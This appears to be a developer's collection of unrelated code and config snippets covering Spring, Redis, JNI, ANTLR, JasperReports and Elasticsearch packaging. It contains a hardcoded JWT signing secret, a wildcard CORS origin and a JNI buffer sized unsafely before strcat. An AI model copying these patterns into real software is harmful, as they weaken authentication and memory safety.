                .serverPorts(redisHosts) //you will get different ports. Go figure
                .withServerBuilder(new CustomClusterRedisServerBuilder().setting("maxmemory 128").setting("maxheap 128M")) //same goes for settings
                .withSentinelBuilder(RedisSentinel.builder().setting("maxmemory 128").setting("maxheap 128M"))
                .sentinelCount(3)
                .quorumSize(2)
                .replicationGroup("master1", 1)
                .replicationGroup("master2", 1)
                .replicationGroup("master3", 1)
                .build()
--------------------------------------------------------------------------------------------------------
final String authorization = httpRequest.getHeader("Authorization");
if (authorization != null && authorization.toLowerCase().startsWith("basic")) {
    // Authorization: Basic base64credentials
    String base64Credentials = authorization.substring("Basic".length()).trim();
    byte[] credDecoded = Base64.getDecoder().decode(base64Credentials);
    String credentials = new String(credDecoded, StandardCharsets.UTF_8);
    // credentials = username:password
    final String[] values = credentials.split(":", 2);
}
--------------------------------------------------------------------------------------------------------
Usage: ./redis-server [/path/to/redis.conf]
       ./redis-server - (read config from stdin)
       ./redis-server --test-memory <megabytes>
--------------------------------------------------------------------------------------------------------
mvn archetype:generate  \
    -D archetypeGroupId=org.apache.isis.archetype \
    -D archetypeArtifactId=simpleapp-archetype \
    -D archetypeVersion=2.0.0-M2 \
    -D groupId=com.mycompany \
    -D artifactId=myapp \
    -D version=1.0-SNAPSHOT \
    -B
--------------------------------------------------------------------------------------------------------
@Component
public class FactoryMethodComponent {

  private static int i;

  @Bean @Qualifier("public")
  public TestBean publicInstance() {
      return new TestBean("publicInstance");
  }

  // use of a custom qualifier and autowiring of method parameters

  @Bean @BeanAge(1)
  protected TestBean protectedInstance(@Qualifier("public") TestBean spouse,
                                       @Value("#{privateInstance.age}") String country) {
      TestBean tb = new TestBean("protectedInstance", 1);
      tb.setSpouse(tb);
      tb.setCountry(country);
      return tb;
  }

  @Bean @Scope(BeanDefinition.SCOPE_SINGLETON)
  private TestBean privateInstance() {
      return new TestBean("privateInstance", i++);
  }

  @Bean @Scope(value = WebApplicationContext.SCOPE_SESSION,
               proxyMode = ScopedProxyMode.TARGET_CLASS)
  public TestBean requestScopedInstance() {
      return new TestBean("requestScopedInstance", 3);
  }
}
--------------------------------------------------------------------------------------------------------
CREATE TABLE IF NOT EXISTS `articles` (
  `article_id` int(5) NOT NULL AUTO_INCREMENT,
  `title` varchar(200) NOT NULL,
  `category` varchar(100) NOT NULL,
  PRIMARY KEY (`article_id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;

INSERT INTO `articles` (`article_id`, `title`, `category`) VALUES
	(1, 'Spring REST Security', 'Spring'),
	(2, 'Java Concurrency', 'Java'); 
--------------------------------------------------------------------------------------------------------

apply plugin: 'java'
apply plugin: 'eclipse'
apply plugin: 'war'
war.archiveName 'spring-app.war'

sourceCompatibility = 9

repositories {
    mavenCentral()
}
dependencies {
    compile 'org.springframework.boot:spring-boot-starter-web:2.0.4.RELEASE'
    compile 'org.springframework.boot:spring-boot-starter-data-jpa:2.0.4.RELEASE'    
    compile 'org.springframework.boot:spring-boot-starter-data-redis:2.0.4.RELEASE'
    compile 'mysql:mysql-connector-java:6.0.5'
    compile 'org.apache.commons:commons-dbcp2:2.1.1'
    compile 'javax.xml.bind:jaxb-api:2.3.0'
    providedRuntime 'org.springframework.boot:spring-boot-starter-tomcat:2.0.4.RELEASE'    
} 
--------------------------------------------------------------------------------------------------------
@Component("fooFormatter")
public class FooFormatter implements Formatter {
 
    public String format() {
        return "foo";
    }
}

@Component("barFormatter")
public class BarFormatter implements Formatter {
 
    public String format() {
        return "bar";
    }
}
	
public class FooService {
     
    @Autowired
    private Formatter formatter;
 
}
--------------------------------------------------------------------------------------------------------
const protobuf = require('protobufjs');

const testData = {
    name: 'Jack', 
    age: 12
};
...
// convert the object testData to protobuf

console.log(<the converted protobuf>)
--------------------------------------------------------------------------------------------------------
Map<String, Integer> map = 
    intList.stream().collect(toMap(i -> String.valueOf(i % 3), 
                                   i -> i, 
                                   Integer::sum));
								   
Map<String,Role> mappedRoles = Maps.uniqueIndex(yourList, new Function<Role,String>() {
  public String apply(Role from) {
    return from.getName(); // or something else
  }});
--------------------------------------------------------------------------------------------------------
public static <K, V> Map<K, V> listAsMap(Collection<V> sourceList, ListToMapConverter<K, V> converter) {
    Map<K, V> newMap = new HashMap<K, V>();
    for (V item : sourceList) {
        newMap.put( converter.getKey(item), item );
    }
    return newMap;
}

public static interface ListToMapConverter<K, V> {
    public K getKey(V item);
}
--------------------------------------------------------------------------------------------------------
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    ObjectOutputStream oos = new ObjectOutputStream(baos);


    oos.writeObject(obj);

    oos.flush();
    oos.close();

    InputStream is = new ByteArrayInputStream(baos.toByteArray());
--------------------------------------------------------------------------------------------------------
@ProtoClass(ProtoObject.class)
Class DomainClass{
  @ProtoField
  private String field1;
  @ProtoField(name = "xyz") // in case proto and domain class field have different names
  private String field2;
}
--------------------------------------------------------------------------------------------------------
{
  "name": "projectName",
  "version": "0.0.0",
  "description": "Blank Project for React.js",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "author": "",
  "license": "ISC",
  "devDependencies": {
    "browserify": "^9.0.3",
    "gulp": "^3.8.11",
    "react": "^0.13.1",
    "reactify": "^1.1.0",
    "vinyl-source-stream": "^1.1.0"
  }
}

 
import org.ironjacamar.validator.rules.ao.AOConfigProperties;
import org.ironjacamar.validator.rules.ao.AOConstructor;
import org.ironjacamar.validator.rules.ao.AONull;
import org.ironjacamar.validator.rules.ao.AORAA;
import org.ironjacamar.validator.rules.as.AS;
import org.ironjacamar.validator.rules.as.ASConfigProperties;
import org.ironjacamar.validator.rules.as.ASConstructor;
import org.ironjacamar.validator.rules.as.ASNull;
import org.ironjacamar.validator.rules.cf.CFConstructor;
import org.ironjacamar.validator.rules.cf.CFNull;
import org.ironjacamar.validator.rules.cf.CFReferenceable;
import org.ironjacamar.validator.rules.cf.CFSerializable;
import org.ironjacamar.validator.rules.mc.MC;
import org.ironjacamar.validator.rules.mc.MCGetMetaData;
import org.ironjacamar.validator.rules.mcf.MCF;
import org.ironjacamar.validator.rules.mcf.MCFConfigProperties;
import org.ironjacamar.validator.rules.mcf.MCFConstructor;
import org.ironjacamar.validator.rules.mcf.MCFEquals;
import org.ironjacamar.validator.rules.mcf.MCFHashCode;
import org.ironjacamar.validator.rules.mcf.MCFNull;
import org.ironjacamar.validator.rules.ra.RA;
import org.ironjacamar.validator.rules.ra.RAConfigProperties;
import org.ironjacamar.validator.rules.ra.RAConstructor;
import org.ironjacamar.validator.rules.ra.RAEquals;
import org.ironjacamar.validator.rules.ra.RAHashCode;
import org.ironjacamar.validator.rules.ra.RANull;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.LinkedList;
import java.util.List;
import java.util.Locale;
import java.util.ResourceBundle;

/**
 * Validator
 */
public class Validator
{
   /**
    * The fully qualified class name of the rules
    * as we may want to externalize them into a
    * properties file
    */
   private static final Rule[] CLASS_RULES = {
      new MCFNull(),
      new MCF(),
      new MCFConstructor(),
      new MCFHashCode(),
      new MCFEquals(),
      new MCFConfigProperties(),
      new MC(),
      new MCGetMetaData(),
      new RANull(),
      new RA(),
      new RAConstructor(),
      new RAHashCode(),
      new RAEquals(),
      new RAConfigProperties(),
      new CFConstructor(),
      new CFNull(),
      new CFSerializable(),
      new CFReferenceable(),
      new ASNull(),
      new AS(),
      new ASConstructor(),
      new ASConfigProperties(),
      new AONull(),
      new AOConstructor(),
      new AOConfigProperties(),
      new AORAA()
   };

   private static final Rule[] OBJECT_RULES = {
      new MCGetMetaData(),
   };

   private static Rule[] allRules;
   static
   {
      List<Rule> arrayList = new ArrayList<>();
      arrayList.addAll(Arrays.asList(CLASS_RULES));
      arrayList.addAll(Arrays.asList(OBJECT_RULES));
      allRules = arrayList.toArray(new Rule[CLASS_RULES.length + OBJECT_RULES.length]);
   };

   /**
    * Constructor
    */
   public Validator()
   {
   }

   /**
    * Get the resource bundle
    * @return The resource bundle
    */
   public ResourceBundle getResourceBundle()
   {
      return ResourceBundle.getBundle("validator", Locale.US,
                                      SecurityActions.getClassLoader(Validator.class));
   }

   /**
    * Validate
    *
    * @param objects Objects that should be validated
    * @return The list of failures; <code>null</code> if no errors
    */
   public List<Failure> validate(List<Validate> objects)
   {
      if (objects == null || objects.isEmpty())
         return null;

      return execRulesOnValidates(objects);
   }

   /**
    * exec rules
    * @param objects to be validated
    * @return The list of failures; an Empty list if no errors
    */
   private List<Failure> execRulesOnValidates(List<Validate> objects)
   {
      ResourceBundle resourceBundle = getResourceBundle();

      List<Failure> result = null;

      for (Rule rule : allRules)
      {
         for (Validate obj : objects)
         {
            List<Failure> failures = rule.validate(obj, resourceBundle);

            if (failures != null)
            {
               if (result == null)
               {
                  result = new LinkedList<>();
               }
               result.addAll(failures);
            }
         }
      }

      return result;
   }
}
--------------------------------------------------------------------------------------------------------

import org.jboss.logging.BasicLogger;
import org.jboss.logging.annotations.Cause;
import org.jboss.logging.annotations.LogMessage;
import org.jboss.logging.annotations.Message;
import org.jboss.logging.annotations.MessageLogger;

import static org.jboss.logging.Logger.Level.INFO;
import static org.jboss.logging.Logger.Level.WARN;

/**
 * The deployers logger.
 *
 * Message ids ranging from 020000 to 029999 inclusively.
 */
@MessageLogger(projectCode = "IJ2")
public interface DeployersLogger extends BasicLogger
{
   // ABSTRACT RESOURCE ADAPTER DEPLOYER

   /**
    * Required license terms
    * @param url The license url
    */
   @LogMessage(level = INFO)
   @Message(id = 20001, value = "Required license terms for %s")
   public void requiredLicenseTerms(String url);

   /**
    * Deployed
    * @param archiveName The archive name
    */
   @LogMessage(level = INFO)
   @Message(id = 20002, value = "Deployed: %s")
   public void deployed(String archiveName);

   /**
    * Changed TransactionSupport
    * @param jndiName The JNDI name
    */
   @LogMessage(level = INFO)
   @Message(id = 20003, value = "Changed TransactionSupport for %s")
   public void changedTransactionSupport(String jndiName);

   /**
    * Validation report failure
    * @param detail The details
    * @param t The exception
    */
   @LogMessage(level = WARN)
   @Message(id = 20004, value = "Failure during validation report generation: %s")
   public void validationReportFailure(String detail, @Cause Throwable t);

   /**
    * Invalid archive
    * @param archive The archive
    */
   @LogMessage(level = WARN)
   @Message(id = 2005, value = "Invalid archive: %s")
   public void validationInvalidArchive(String archive);
}
--------------------------------------------------------------------------------------------------------
#include <jni.h>
#include <string.h>
#include <stdlib.h>
#include "build/c/HelloWorld.h"

/*
 * Class:     org_ironjacamar_samples_helloworld_HelloWorldManagedConnection
 * Method:    helloWorld
 * Signature: (Ljava/lang/String;)Ljava/lang/String;
 */
JNIEXPORT jstring JNICALL 
Java_org_ironjacamar_samples_helloworld_HelloWorldManagedConnection_helloWorld(JNIEnv *env, jobject o, jstring s)
{
   int length = 0;

   if (s != NULL)
      length = (*env)->GetStringLength(env, s);

   char *buf = (char*)malloc(16 + length);

   strcpy(buf, "Hello World, ");

   if (s != NULL)
      strcat(buf, (*env)->GetStringUTFChars(env, s, 0));

   strcat(buf, " !");

   jstring result = (*env)->NewStringUTF(env, buf);

   free(buf);

   return result;
}
--------------------------------------------------------------------------------------------------------
PROJECT(helloworld-native)

CMAKE_MINIMUM_REQUIRED (VERSION 2.8)
SET(CMAKE_VERBOSE_MAKEFILE 1)

SET(LIBRARY_OUTPUT_PATH build)
SET(BUILD_SHARED_LIBS ON)
SET(CMAKE_INCLUDE_CURRENT_DIR ON)

FIND_PACKAGE(Java)
FIND_PACKAGE(JNI)

INCLUDE_DIRECTORIES(${JAVA_INCLUDE_PATH})
INCLUDE_DIRECTORIES(${JAVA_INCLUDE_PATH2})

ADD_LIBRARY(HelloWorld helloworld.c)
--------------------------------------------------------------------------------------------------------
# Additional logger names to configure (root logger is always configured)
loggers=org.ironjacamar,org.jboss,org.jnp,com.arjuna

# Root logger level
logger.level=INFO
logger.handlers=CONSOLE, FILE

# org.ironjacamar
logger.org.ironjacamar.level=TRACE

# org.jgroups
logger.org.jgroups.level=TRACE

# org.jboss
logger.org.jboss.level=INFO

# org.jnp
logger.org.jnp.level=INFO

# com.arjuna
logger.com.arjuna.level=INFO

# Console handler configuration
handler.CONSOLE=org.jboss.logmanager.handlers.ConsoleHandler
handler.CONSOLE.properties=autoFlush
handler.CONSOLE.level=WARN
handler.CONSOLE.autoFlush=true
handler.CONSOLE.formatter=PATTERN

# File handler configuration
handler.FILE=org.jboss.logmanager.handlers.FileHandler
handler.FILE.level=TRACE
handler.FILE.properties=autoFlush,fileName
handler.FILE.autoFlush=true
handler.FILE.fileName=build/test.log
handler.FILE.formatter=PATTERN

# Formatter pattern configuration
formatter.PATTERN=org.jboss.logmanager.formatters.PatternFormatter
formatter.PATTERN.properties=pattern
formatter.PATTERN.pattern=%d{HH:mm:ss,SSS} %-5p [%c{1}] %m%n
--------------------------------------------------------------------------------------------------------
lexer grammar SelectHtmlLexer;


K_SELECT    :   S E L E C T ;
K_FROM      :   F R O M ;
K_WHERE     :   W H E R E ;

K_ATTR      :   (A T T R | A T T R I B U T E) ;
K_ATTRS     :   (A T T R S | A T T R I B U T E S) ;
K_TEXT      :   T E X T ;
K_HTML      :   H T M L ;
K_TAG       :   T A G ;
K_ID        :   I D ;
K_CLASS     :   C L A S S ;
K_CLASSES   :   C L A S S E S;

K_OR        :   O R ;
K_AND       :   A N D ;
K_START     :   S T A R T ;
K_END       :   E N D ;
K_CONTAINS  :   C O N T A I N S ;
K_REGEX     :   R E G E X ;

K_NEXT      :   N E X T ;
K_SIBLING   :   S I B L I N G ;
K_SIBLINGS  :   S I B L I N G S ;
K_DESCENDANT:   D E S C E N D A N T  ;
K_PARENT    :   P A R E N T ;
K_CHILD     :   C H I L D ;

K_OF        :   O F ;
K_WITH      :   W I T H ;

EQUAL       :   '=' ;
ALL         :   '*' ;
OPEN_P      :   '(' ;
CLOSE_P     :   ')' ;

STRING      :    '\'' ('\\'. | '\'\'' | ~('\'' | '\\'))* '\'' ;

LINE_COMMENT    : '//' .*? '\r'? '\n'  -> skip ;
WS              : [ \t\r\n]+ -> skip ;

fragment DIGIT  : [0-9];
fragment LETTER : ('a'..'z'|'A'..'Z');
fragment A      : [aA];
fragment B      : [bB];
fragment C      : [cC];
fragment D      : [dD];
fragment E      : [eE];
fragment F      : [fF];
fragment G      : [gG];
fragment H      : [hH];
fragment I      : [iI];
fragment J      : [jJ];
fragment K      : [kK];
fragment L      : [lL];
fragment M      : [mM];
fragment N      : [nN];
fragment O      : [oO];
fragment P      : [pP];
fragment Q      : [qQ];
fragment R      : [rR];
fragment S      : [sS];
fragment T      : [tT];
fragment U      : [uU];
fragment V      : [vV];
fragment W      : [wW];
fragment X      : [xX];
fragment Y      : [yY];
fragment Z      : [zZ];
fragment SPACE  : ' ';
--------------------------------------------------------------------------------------------------------
import java.math.BigDecimal;
import java.math.RoundingMode;
import java.util.Arrays;
import java.util.List;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

import br.com.leonardoz.quantocusta.exceptions.PagamentoInvalidoException;
import br.com.leonardoz.quantocusta.util.Concatenador;

public class CalculadoraPagamento {

	private int vezes;
	private BigDecimal entrada;
	private BigDecimal descontoAVistaUnitario;
	private BigDecimal jurosMensaisUnitario;
	private BigDecimal valor;
	private BigDecimal jurosMensaisPercentuais;
	private BigDecimal descontoAVistaPercentual;

	public List<FormatoPagamento> calcular(
			BigDecimal valor, 
			int vezes, BigDecimal entrada,
			BigDecimal descontoAVistaPercentual, 
			BigDecimal jurosMensaisPercentuais)
					throws PagamentoInvalidoException {
		
		verificarParametrosBasicos(valor, vezes);
		atribuirValores(valor, vezes, entrada, descontoAVistaPercentual, jurosMensaisPercentuais);
		return executar();
	}
	
	private void verificarParametrosBasicos(BigDecimal valor, int vezes) {
		avaliarSeEhValido(valor, "Valor");
		avaliarSeEhValido(vezes, "Número de vezes (parcelas)");
	}
	
	private void verificarParametrosParcelado(BigDecimal entrada, BigDecimal jurosMensaisPercentuais) {
		avaliarSeEhValido(jurosMensaisPercentuais, "Juros mensais percentuais");
		avaliarSeEhValido(entrada, "Entrada");
		avaliaEntrada(entrada, valor);
	}
	
	private void verificarParametrosAVista(BigDecimal descontoAVistaPercentual) {
		avaliarSeEhValido(descontoAVistaPercentual, "Desconto à vista percentual");
		avaliaDesconto(descontoAVistaPercentual, valor);
	}
	
	private void atribuirValores(BigDecimal valor, int vezes, BigDecimal entrada, BigDecimal descontoAVistaPercentual,
			BigDecimal jurosMensaisPercentuais) {
		this.valor = valor;
		this.vezes = vezes;
		this.entrada = entrada;
		this.descontoAVistaPercentual = descontoAVistaPercentual;
		this.jurosMensaisPercentuais = jurosMensaisPercentuais;
		this.jurosMensaisUnitario = adequarTaxas(jurosMensaisPercentuais, BigDecimal.ZERO);
		this.descontoAVistaUnitario = adequarTaxas(descontoAVistaPercentual, BigDecimal.ZERO);
	}

	private List<FormatoPagamento> executar() {
		boolean ehParcelado = vezes > 1;
		if (ehParcelado) {
			return calculaParcelado();
		} else {
			return Arrays.asList(calculaAVista());
		}
	}

	private void avaliaEntrada(BigDecimal entrada, BigDecimal valorTotal) {
		int comparado = entrada.compareTo(valorTotal);
		if (comparado >= 0) {
			String msg = Concatenador.concatenar("Entrada não deve ser igual ou maior que ",
					valorTotal.toString());
			throw new PagamentoInvalidoException(msg);
		}
	}

	private void avaliaDesconto(BigDecimal descontoAVistaPercentual, BigDecimal valorTotal) {
		int comparado = descontoAVistaPercentual.compareTo(BigDecimal.valueOf(100));
		if (comparado == 1) {
			String msg = Concatenador.concatenar("Desconto à vista percentual não deve ser maior que 100% ");
			throw new PagamentoInvalidoException(msg);
		}
	}
	
	private void avaliarSeEhValido(Integer valor, String campo) {
		if (valor == null)
			throw new PagamentoInvalidoException(Concatenador.concatenar(campo, " não deve ser nulo."));

		if (valor.compareTo(0) == -1)
			throw new PagamentoInvalidoException(Concatenador.concatenar(campo, " não deve ser um valor negativo."));
	}
	
	private void avaliarSeEhValido(BigDecimal valor, String campo) {
		if (valor == null)
			throw new PagamentoInvalidoException(Concatenador.concatenar(campo, " não deve ser nulo."));

		if (valor.compareTo(BigDecimal.ZERO) == -1)
			throw new PagamentoInvalidoException(Concatenador.concatenar(campo, " não deve ser um valor negativo."));
	}

	private BigDecimal adequarTaxas(BigDecimal taxaPercentual, BigDecimal fallback) {
		if (taxaPercentual == null || taxaPercentual.equals(BigDecimal.ZERO)) {
			taxaPercentual = fallback;
			return taxaPercentual;
		} else {
			BigDecimal cento = BigDecimal.valueOf(100);
			return taxaPercentual.divide(cento, 2, RoundingMode.CEILING);
		}
	}

	private List<FormatoPagamento> calculaParcelado() {
		verificarParametrosParcelado(entrada, jurosMensaisPercentuais);
		BigDecimal subTotal = valor.subtract(entrada);

		BigDecimal valorDeParcela = subTotal.divide(BigDecimal.valueOf(vezes), 2, RoundingMode.CEILING);
		// se aumento é de 1,75%, então multiplica valor por 1 + 0,0175
		BigDecimal fator = BigDecimal.ONE.add(jurosMensaisUnitario);
		BigDecimal valorDaParcelaComJuros = valorDeParcela.multiply(fator);
		
		List<FormatoPagamento> parcelas = IntStream
										.range(1, vezes + 1)
										.mapToObj(num -> new Parcela(num, valorDaParcelaComJuros, jurosMensaisPercentuais))
										.collect(Collectors.toList());
		return parcelas;
	}

	private FormatoPagamento calculaAVista() {
		verificarParametrosAVista(descontoAVistaPercentual);
		// se desconto é de 0,1, então 1 - 0,1 = 0,9; 0,9 * valor = valor descontado
		BigDecimal fator = BigDecimal.ONE.subtract(descontoAVistaUnitario);
		BigDecimal total = valor.multiply(fator);
		PagamentoUnico pagamentoUnico = new PagamentoUnico(total);
		return pagamentoUnico;
	}

}
--------------------------------------------------------------------------------------------------------
# Algumas variaveis de ambiente, por enquanto apenas essas (conveniência)
server.context-path=/quantocusta/api
spring.jpa.hibernate.ddl-auto=none
spring.datasource.url=jdbc:mysql://localhost/quantocusta
spring.datasource.username=${quantocusta_db_user}
spring.datasource.password=${quantocusta_db_senha}
spring.datasource.driver-class-name=com.mysql.jdbc.Driver


# JWT
jwt.secret=_@htpa-0329i98d9wahJk283287*!8!!,;.232lOJDhdq
jwt.expiration=604800

# CORS
cors.origin=${quantocusta_cors_origin}

#Email
spring.mail.host=smtp.gmail.com
spring.mail.port=587 
spring.mail.username=${quantocusta_email_endereco}
spring.mail.password=${quantocusta_email_senha}
spring.mail.protocol=smtp
spring.mail.defaultEncoding=UTF-8
spring.mail.properties.mail.smtp.auth=true
spring.mail.properties.mail.smtp.starttls.enable=true
spring.mail.properties.mail.smtp.starttls.required=true
spring.mail.test-connection=true
spring.mail.properties.mail.smtp.ssl.trust=smtp.gmail.com
spring.mail.properties.mail.smtp.socketFactory.fallback=true
--------------------------------------------------------------------------------------------------------
mvn install:install-file -Dfile=primefaces-estoque-theme.jar -DgroupId=com.leonardoz.estoque -DartifactId=primefaces-estoque-theme -Dversion=1.0-SNAPSHOT -Dpackaging=jar
--------------------------------------------------------------------------------------------------------
@Column(columnDefinition = "binary(20)", nullable = false, name = "senha_hash")


import javax.faces.component.UIComponent;
import javax.faces.context.FacesContext;
import javax.faces.convert.Converter;
import javax.faces.convert.FacesConverter;
import javax.inject.Inject;
import javax.inject.Named;

@Named
@FacesConverter(forClass = Produto.class, value = "produtoConverter")
public class ProdutoConverter implements Converter {

    @Inject
    private Produtos produtos;

    @Override
    public Object getAsObject(FacesContext context, UIComponent component, String value) {
	Produto retorno = null;
	System.out.println("O valor é " + value);
	if (value != null && !"".equals(value)) {
	    retorno = produtos.recuperarProduto(Long.valueOf(value)).orElseThrow(IllegalArgumentException::new);
	    System.out.println("Voltou " + retorno.getDescricao());
	}
	return retorno;
    }

    @Override
    public String getAsString(FacesContext context, UIComponent component, Object value) {
	if (value != null) {
	    Produto produto = ((Produto) value);
	    return produto.getId() == null ? null : produto.getId().toString();
	}
	return null;
    }
}

import javax.persistence.AttributeConverter;
import javax.persistence.Converter;

@Converter(autoApply = true)
public class SexoJpaConverter implements AttributeConverter<Sexo, String> {

    @Override
    public String convertToDatabaseColumn(Sexo attribute) {
	return attribute.getSigla();
    }

    @Override
    public Sexo convertToEntityAttribute(String dbData) {
	return Sexo.porSigla(dbData);
    }
}
--------------------------------------------------------------------------------------------------------
@SerializedName("_embedded")
--------------------------------------------------------------------------------------------------------
import java.math.BigDecimal;
import java.math.RoundingMode;
import java.text.DecimalFormat;

import net.sf.jasperreports.functions.annotations.Function;
import net.sf.jasperreports.functions.annotations.FunctionCategories;
import net.sf.jasperreports.functions.annotations.FunctionParameter;
import net.sf.jasperreports.functions.annotations.FunctionParameters;

@FunctionCategories({ com.fred.functions.FredCustomFunctions.class })
public class CustomFunctions {

	private static String NUMBER_FORMAT_DECIMAL  = "#,##0.00";
	private static String NUMBER_FORMAT_NO_DECIMAL  = "#,##0";
	
	@Function("FORMAT_WITH_DECIMAL")
	@FunctionParameters({ @FunctionParameter("number"),
			@FunctionParameter("scale"), 
			@FunctionParameter("prefix"),
			@FunctionParameter("suffix") 
	})
	public static String formatTimeDecimal(double number,int scale,String prefix,String suffix){
		return formatNumberValue(NUMBER_FORMAT_DECIMAL,number, scale, prefix, suffix);
	}
	
	
	@Function("FORMAT_WITHOUT_DECIMAL")
	@FunctionParameters({ @FunctionParameter("number"),
			@FunctionParameter("prefix"),
			@FunctionParameter("suffix") 
	})
	public static String formatTimeFixed(double number,String prefix,String suffix){
		return formatNumberValue(NUMBER_FORMAT_NO_DECIMAL,number, 0, prefix, suffix);
	}

	private static String formatNumberValue(String format,double number,int scale, String prefix, String suffix) {
		StringBuilder builder = new StringBuilder();
		
		double doubleValue = new BigDecimal(number).setScale(scale, RoundingMode.HALF_UP).doubleValue();
		
		DecimalFormat df = new DecimalFormat(NUMBER_FORMAT_DECIMAL);
		String formatted = df.format(doubleValue);
		
		builder.append(prefix);
		builder.append(formatted);
		builder.append(suffix);
		return builder.toString();
	}
	
import net.sf.jasperreports.functions.annotations.FunctionCategory;

@FunctionCategory()
public class FredCustomFunctions {
}
--------------------------------------------------------------------------------------------------------
@EnableHypermediaSupport(type = EnableHypermediaSupport.HypermediaType.HAL)
--------------------------------------------------------------------------------------------------------
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.cloud.netflix.eureka.EnableEurekaClient;
import org.springframework.cloud.netflix.zuul.EnableZuulProxy;
import org.springframework.security.oauth2.config.annotation.web.configuration.EnableOAuth2Client;
import org.springframework.security.oauth2.config.annotation.web.configuration.EnableResourceServer;

@SpringBootApplication
@EnableEurekaClient
@EnableZuulProxy
@EnableOAuth2Client
@EnableResourceServer
public class GatewayServiceApplication {
    public static void main(String[] args) {
        SpringApplication.run(GatewayServiceApplication.class, args);
    }
}
--------------------------------------------------------------------------------------------------------
import org.springframework.web.context.ContextLoaderListener;
import org.springframework.web.context.support.AnnotationConfigWebApplicationContext;

import javax.servlet.ServletContext;
import javax.servlet.ServletException;

public class WebApplicationInitializer implements org.springframework.web.WebApplicationInitializer {
    @Override
    public void onStartup(ServletContext servletContext) throws ServletException {
        AnnotationConfigWebApplicationContext rootContext = new AnnotationConfigWebApplicationContext();
        rootContext.register(SpringConfiguration.class);
        servletContext.addListener(new ContextLoaderListener(rootContext));
    }
}
--------------------------------------------------------------------------------------------------------
import javax.xml.bind.ValidationEvent;
import javax.xml.bind.ValidationEventHandler;

public class ErrorHandler implements ValidationEventHandler {

  @Override
  public boolean handleEvent(ValidationEvent event) {
    boolean stop = false;
    switch (event.getSeverity()) {
      case ValidationEvent.WARNING:
        stop = true;
        break;
      case ValidationEvent.ERROR:
        stop = false;
        System.err.println(event.getMessage());
        System.err.println("line " + event.getLocator().getLineNumber());
        System.err.println("column " + event.getLocator().getColumnNumber());
        break;
      case ValidationEvent.FATAL_ERROR:
        stop = false;
        System.err.println(event.getMessage());
        System.err.println("line " + event.getLocator().getLineNumber());
        System.err.println("column " + event.getLocator().getColumnNumber());
        break;
      default:
        throw new RuntimeException("unknow validation error");
    }
    return stop;
  }
}
--------------------------------------------------------------------------------------------------------
spring:
  application:
    name: auth
  data:
    mongodb:
      host: localhost
      database: cinemausers
      port: 27017
server:
  port: 5000
cors:
  origin: '*'
logging:
  level:
    org:
      springframework:
        security: DEBUG
--------------------------------------------------------------------------------------------------------
mport feign.RequestInterceptor;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.cloud.netflix.eureka.EnableEurekaClient;
import org.springframework.cloud.netflix.feign.EnableFeignClients;
import org.springframework.context.annotation.Bean;
import org.springframework.security.config.annotation.method.configuration.EnableGlobalMethodSecurity;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.oauth2.client.OAuth2RestTemplate;
import org.springframework.security.oauth2.client.token.grant.client.ClientCredentialsResourceDetails;
import org.springframework.security.oauth2.config.annotation.web.configuration.EnableOAuth2Client;
import org.springframework.security.oauth2.config.annotation.web.configuration.EnableResourceServer;
import org.springframework.security.oauth2.provider.authentication.OAuth2AuthenticationDetails;

@SpringBootApplication
@EnableOAuth2Client
@EnableResourceServer
@EnableGlobalMethodSecurity(securedEnabled = true, prePostEnabled = true)
@EnableFeignClients
@EnableEurekaClient
public class SeanceApplication {
    public static void main(String[] args) {
        SpringApplication.run(SeanceApplication.class);
    }

    @Bean
    @ConfigurationProperties(prefix = "security.oauth2.client")
    public ClientCredentialsResourceDetails clientCredentialsResourceDetails() {
        return new ClientCredentialsResourceDetails();
    }

    @Bean
    public OAuth2RestTemplate clientCredentialsRestTemplate() {
        return new OAuth2RestTemplate(clientCredentialsResourceDetails());
    }

    @Bean
    public RequestInterceptor requestTokenBearerInterceptor() {
        return requestTemplate -> {
            Authentication authentication = SecurityContextHolder.getContext().getAuthentication();
            OAuth2AuthenticationDetails details = (OAuth2AuthenticationDetails) authentication.getDetails();
            requestTemplate.header("Authorization", "Bearer " + details.getTokenValue());
        };
    }
}
--------------------------------------------------------------------------------------------------------
    public void init(String[] args) throws Exception {

        RefineServer server = new RefineServer();
        server.init(host,port);

        boolean headless = Configurations.getBoolean("refine.headless",false);
        if (headless) {
            System.setProperty("java.awt.headless", "true"); 
        } else {
            try {
                RefineClient client = new RefineClient();
                client.init(host,port);
            } catch (Exception e) {
                logger.warn("Sorry, some error prevented us from launching the browser for you.\n\n Point your browser to http://" + host + ":" + port + "/ to start using Refine.");
            }
        }
        
        // hook up the signal handlers
        Runtime.getRuntime().addShutdownHook(
            new Thread(new ShutdownSignalHandler(server))
        );
 
        server.join();
    }
	
	class ShutdownSignalHandler implements Runnable {
    
    private Server _server;

    public ShutdownSignalHandler(Server server) {
        this._server = server;
    }

    @Override
    public void run() {

        // Tell the server we want to try and shutdown gracefully
        // this means that the server will stop accepting new connections
        // right away but it will continue to process the ones that
        // are in execution for the given timeout before attempting to stop
        // NOTE: this is *not* a blocking method, it just sets a parameter
        //       that _server.stop() will rely on
        _server.setGracefulShutdown(3000);

        try {
            _server.stop();
        } catch (Exception e) {
            e.printStackTrace();
            System.exit(1);
        }
    }

}

       @Override
            public int compareKeys(Object key1, Object key2) {
                double d1 = ((Number) key1).doubleValue();
                double d2 = ((Number) key2).doubleValue();
                return d1 < d2 ? -1 : (d1 > d2 ? 1 : 0);
            }
--------------------------------------------------------------------------------------------------------
hasBeenEnabledOnStart=false

if [ $1 -eq 1 ] ; then 
    # Initial installation 
    if [ -x /bin/systemctl ] ; then
        /bin/systemctl daemon-reload >/dev/null 2>&1 || :
        /bin/systemctl enable elasticsearch.service
        /bin/systemctl start elasticsearch.service
        hasBeenEnabledOnStart=true
    fi

    if [ -x /sbin/chkconfig -a "$hasBeenEnabledOnStart" == "false" ] ; then
        /sbin/chkconfig --add elasticsearch
